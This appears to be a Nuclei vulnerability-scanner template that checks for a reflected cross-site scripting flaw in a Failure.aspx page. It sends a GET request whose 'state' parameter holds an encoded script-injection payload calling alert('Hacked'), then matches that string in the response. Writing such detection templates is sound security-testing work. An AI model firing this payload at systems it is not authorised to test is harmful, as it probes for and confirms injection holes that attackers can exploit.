id: failure-asp-xss-haxshadow

info:
  name: Failure.aspx Reflected XSS
  author: haxshadow
  severity: medium
  description: |
    Reflected XSS in Failure.aspx via the `state` parameter.
  tags: xss,reflected,asp

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Mondo/lang/sys/Failure.aspx?state=%22;}alert('Hacked');function test(){%22"

    matchers:
      - type: word
        words:
          - "alert('Hacked')"
        part: body

    extractors:
      - type: regex
        name: reflected_payload
        regex:
          - "alert\\('Hacked'\\)"
        part: body
